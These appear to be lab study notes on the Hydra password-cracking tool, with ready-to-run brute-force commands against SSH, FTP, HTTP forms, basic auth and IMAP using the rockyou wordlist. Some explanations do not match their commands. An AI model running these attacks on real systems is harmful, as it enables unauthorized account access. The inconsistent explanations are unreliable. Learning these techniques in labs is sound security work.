## Introduction
- Hydra is a brute force online password cracking program, a quick system login password “hacking” tool.
- Hydra can run through a list and “brute force” some authentication services.
- Hydra supports, i.e., has the ability to brute force the following protocols: “Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MEMCACHED, MONGODB, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, Radmin, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, TeamSpeak (TS2), Telnet, VMware-Auth, VNC and XMPP.”

## Installing Hydra
```python
apt install hydra
```

## Hydra Commands

- The options we pass into Hydra depend on which service (protocol) we’re attacking.

**Example** - 
if we wanted to brute force FTP with the username being `user` and a password list being `passlist.txt`, we’d use the following command:
```python
hydra -l user -P passlist.txt ftp://10.10.162.94
```

### SSH
```python
hydra -l <username> -P <full path to pass> 10.10.162.94 -t 4 ssh
```

![[hydra1.png]]

**Example** - 
```python
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.162.94 -t 4 ssh
```
- Hydra will use `root` as the username for `ssh`
- It will try the passwords in the `passwords.txt` file
- There will be four threads running in parallel as indicated by `-t 4`

#### SSH to account
```python
ssh molly@10.10.162.94
```
### Post Web Form
- We can use Hydra to brute force web forms too.
- You must know which type of request it is making; GET or POST methods are commonly used.
- You can use your browser’s network tab (in developer tools) to see the request types or view the source code.
```python
sudo hydra <username> <wordlist> 10.10.162.94 http-post-form "<path>:<login_credentials>:<invalid_response>"
```
![[hydra2.png]]

#### Below is a more concrete example of Hydra command to brute force a POST login form:
```python
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.2.70 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid" -V 
```
- The login page is only `/`, i.e., the main IP address.
- The `username` is the form field where the username is entered
- The specified username(s) will replace `^USER^`
- The `password` is the form field where the password is entered
- The provided passwords will be replacing `^PASS^`
- Finally, `F=incorrect` is a string that appears in the server reply when the login fails

**Example** - 
```python
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.162.94 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
```

## Brute-forcing Default Passwords(get)
An example used is a page that prompts `Basic HTTP Authentication` form to input the username and password.
![[hydra.webp]]

**The hydra command to brute-force the above:**
```python
hydra -l bob -P /usr/share/wordlists/rockyou.txt -f MachineIP http-get /protected/
```

**Example** - 
```python
hydra -l bob -P /usr/share/wordlists/rockyou.txt -f 10.10.76.6 http-get /protected/
```
Let’s break the commands down.

- -l = login with name
- -P = wordlist or path to wordlist
- -f = Exit when login/pass pair is found
- MachineIP = the target
- http-get = Service
- /protected/ = the webpage with login

#### IMAP Bruteforce:
```sh
hydra -l userlist.txt -P defaultpw imap://192.168.0.1/PLAIN
```
